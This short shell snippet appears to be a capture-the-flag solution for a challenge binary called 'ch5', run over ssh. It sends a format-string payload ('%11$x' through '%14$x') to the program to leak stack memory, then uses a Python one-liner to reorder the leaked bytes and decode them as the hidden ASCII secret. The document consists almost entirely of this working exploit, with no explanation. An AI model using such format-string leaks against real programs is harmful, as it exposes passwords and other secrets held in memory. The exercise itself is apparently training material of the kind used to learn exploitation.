# ssh ... < commands.sh

./ch5 '%11$x %12$x %13$x %14$x' | python3 -c "from struct import unpack, pack; d = unpack('<IIII', bytes.fromhex(input())); d = pack('>IIII', *d); print(d[:13].decode('ascii'))"